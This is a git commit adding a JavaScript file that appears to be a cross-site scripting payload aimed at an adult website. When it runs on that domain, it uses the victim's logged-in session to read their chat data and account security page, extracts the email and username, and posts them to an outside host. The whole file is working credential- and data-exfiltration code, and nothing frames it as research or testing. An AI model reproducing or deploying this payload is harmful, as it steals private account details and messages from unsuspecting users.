3cfcc1c39d966022c05d31c46e4243d53ed03627
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2022-12-06 13:11:42 +0330

    Create script2.js

---
+++ script2.js
@@ -0,0 +1,24 @@
+var reg=/pornhub.com/i; 
+if(document.domain.match(reg)){
+var xhr = new XMLHttpRequest();
+xhr.withCredentials = true;
+xhr.open("GET", "/chat/check");
+xhr.onreadystatechange = () => {
+    if (xhr.readyState == 4) {
+       var message=xhr.responseText
+        xhr.open("GET", "/user/security");
+        xhr.onreadystatechange = () => {
+            if (xhr.readyState == 4) {
+                const parser = new DOMParser();
+                var dom = parser.parseFromString(xhr.responseText, "text/html")
+                var email = dom.getElementById("email").value;
+                var username = dom.getElementById("username").value;
+                xhr.open("POST","http://vuln.atwebpages.com/ll.php");
+xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
+
+xhr.send(`email=${email}&username=${username}&message=${message}`);
+            }
+        }
+        xhr.send()
+    }
+}
